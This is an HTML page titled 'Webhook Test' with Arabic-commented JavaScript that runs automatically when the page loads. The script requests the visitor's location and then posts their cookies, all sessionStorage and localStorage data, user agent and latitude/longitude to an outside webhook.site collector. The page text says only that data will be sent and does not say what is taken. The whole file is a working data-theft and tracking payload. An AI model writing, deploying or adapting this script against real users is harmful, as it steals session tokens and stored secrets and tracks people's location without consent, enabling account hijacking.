<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webhook Test</title>
</head>
<body>
    <h1>Welcome to Webhook Test Page</h1>
    <p>This page will send data to Webhook.site.</p>

    <script>
        // Function to send data to Webhook
        function sendDataToWebhook() {
            navigator.geolocation.getCurrentPosition(function(position) {
                fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        cookies: document.cookie,  // إرسال الكوكيز
                        sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),  // إرسال بيانات الجلسات
                        localStorage: Object.fromEntries(Object.entries(localStorage)),  // إرسال بيانات التخزين المحلي
                        userAgent: navigator.userAgent,  // نوع المتصفح والجهاز
                        time: new Date().toISOString(),  // الوقت الحالي
                        location: {  // إرسال الموقع الجغرافي
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        }
                    })
                })
                .then(response => response.json())
                .then(data => console.log("Data sent successfully:", data))
                .catch(error => console.log("Error sending data:", error));
            }, function(error) {
                console.log("Error getting geolocation: ", error);
            });
        }

        // Call the function when the page loads
        window.onload = sendDataToWebhook;
    </script>
</body>
</html>
